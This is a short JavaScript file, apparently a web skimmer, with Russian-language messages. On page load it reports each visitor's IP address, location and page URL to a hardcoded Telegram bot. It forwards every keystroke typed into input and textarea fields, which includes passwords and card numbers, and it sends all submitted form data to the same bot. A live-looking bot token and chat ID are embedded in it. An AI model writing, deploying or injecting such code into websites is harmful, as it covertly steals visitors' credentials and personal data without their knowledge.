const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message }),
    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            let hashArray = Array.from(new Uint8Array(buffer));
            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
        });
}

function getIPInfo() {
    return fetch("http://ip-api.com/json")
        .then(response => response.json())
        .then(data => {
            return {
                ip: data.query,
                hostname: data.hostname,
                location: `${data.city}, ${data.regionName}, ${data.country}`,
                org: window.location.hostname
            };
        })
        .catch(err => console.error("Ошибка получения информации о IP:", err));
}

function logPageVisit() {
    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `🌐 Новый визит:
- IP: ${info.ip}
- Хост: ${info.hostname}
- Местоположение: ${info.location}
- Организация: ${info.org}
- Страница: ${window.location.href}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
}

document.addEventListener("input", event => {
    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
        const inputType = event.target.type || "unknown";
        const inputValue = event.target.value || "";
        const inputName = event.target.name || "unnamed";
        getIPInfo().then(info => {
            hashDomain(info.org).then(domainHashTag => {
                const message = `🔍 Новой ввод:
- Поле: ${inputName} (${inputType})
- Значение: ${inputValue}
${domainHashTag}`;
                sendToTelegram(message);
            });
        });
    }
});

document.addEventListener("submit", event => {
    const formData = new FormData(event.target);
    const data = Array.from(formData.entries()).map(([key, value]) => `${key}: ${value}`).join("\n");
    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `🚀 Отправка формы:
- IP: ${info.ip}
- Хост: ${info.hostname}
- Местоположение: ${info.location}
- Организация: ${info.org}
- Данные формы:
${data}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
});

logPageVisit();
